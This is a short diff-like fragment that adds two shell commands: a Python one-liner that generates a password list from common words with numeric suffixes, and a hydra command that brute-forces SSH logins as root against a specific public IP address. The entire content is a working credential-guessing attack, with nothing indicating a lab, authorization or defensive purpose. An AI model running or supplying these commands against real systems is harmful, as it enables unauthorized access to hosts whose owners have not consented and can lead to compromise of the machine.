@@ -1,0 +1,8 @@
+ python3 -c "
+words = ['password','admin','root','test','letmein','qwerty','welcome']
+for i in range(500):
+    for w in words:
+        print(f'{w}{i}')
+" > /tmp/passlist.txt
+
+hydra -l root -P /tmp/passlist.txt -t 16 -V ssh://3.22.166.244
